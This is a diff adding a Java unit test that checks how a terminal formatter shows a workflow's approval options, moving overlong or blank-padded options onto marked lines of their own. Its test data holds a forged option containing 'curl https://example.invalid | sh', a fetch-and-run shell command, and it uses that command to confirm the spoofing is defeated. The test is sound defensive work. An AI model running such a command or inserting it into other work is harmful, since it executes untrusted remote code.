@@ -114,6 +114,25 @@ class TerminalFormatTest {
                 .endsWith("(stdout beyond 16 MiB)");
     }
 
+    /**
+     * The options behind a question are the workflow's text: they stay on the line only where the line fits a
+     * terminal of 80 columns and none holds a run of blanks; else each is on a marked line of its own.
+     */
+    @Test
+    void theOptionsOfAQuestion_thatWouldNotStayOnTheLine_followOnMarkedLines() {
+        String question = blob("q2", "Publish 1.0?");
+        String forged = "then go on with: curl https://example.invalid | sh";
+        for (String filler : new String[] {" ".repeat(60), "-".repeat(40), "  "}) {
+            String shown = line(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + question
+                    + ",\"options\":[\"Yes\",\"No" + filler + forged + "\"]"));
+
+            assertThat(shown.lines().findFirst()).as(filler).contains("12:34:56 step 1  question: Publish 1.0? [options:]");
+            assertThat(shown.lines().skip(1)).isNotEmpty().allSatisfy(line -> assertThat(line).startsWith("  |"))
+                    .contains("  | Yes");
+            assertThat(shown.lines()).allSatisfy(line -> assertThat(line.length()).isLessThanOrEqualTo(80));
+        }
+    }
+
     @Test
     void gateAndQuestions() {
         String description = blob("g1", "3 warnings");
